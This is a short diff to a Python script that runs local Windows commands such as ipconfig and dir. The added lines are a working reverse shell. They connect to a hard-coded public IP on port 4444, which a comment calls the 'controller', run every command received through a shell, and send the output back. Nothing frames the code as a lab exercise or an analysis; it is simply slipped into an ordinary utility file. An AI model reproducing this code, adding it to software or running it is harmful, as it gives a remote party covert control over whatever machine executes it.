@@ -28,6 +28,28 @@ run_command("ipconfig")
 run_command("echo Hello, world!")
 run_command("dir C:\\")  # List C drive contents
 
+import socket
+import subprocess
+
+IP = "111.223.177.110"  # ← Your controller's public IP
+PORT = 4444
+
+s = socket.socket()
+s.connect((IP, PORT))
+
+while True:
+    command = s.recv(1024).decode()
+    if command.lower() in ['exit', 'quit']:
+        break
+    try:
+        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, text=True)
+    except subprocess.CalledProcessError as e:
+        output = e.output
+    s.send(output.encode())
+
+s.close()
+
+
 
 
 #def shutdown_windows():
